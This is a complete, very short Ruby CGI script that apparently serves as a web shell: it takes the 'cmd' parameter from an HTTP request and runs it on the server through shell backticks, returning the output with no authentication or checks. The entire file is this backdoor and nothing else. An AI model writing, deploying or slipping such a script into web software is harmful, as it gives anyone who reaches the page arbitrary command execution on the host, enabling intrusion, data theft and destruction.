#!/usr/bin/ruby

require 'cgi'

cgi = CGI.new
puts cgi.header

cmd = cgi.params['cmd']

puts `#{cmd}`

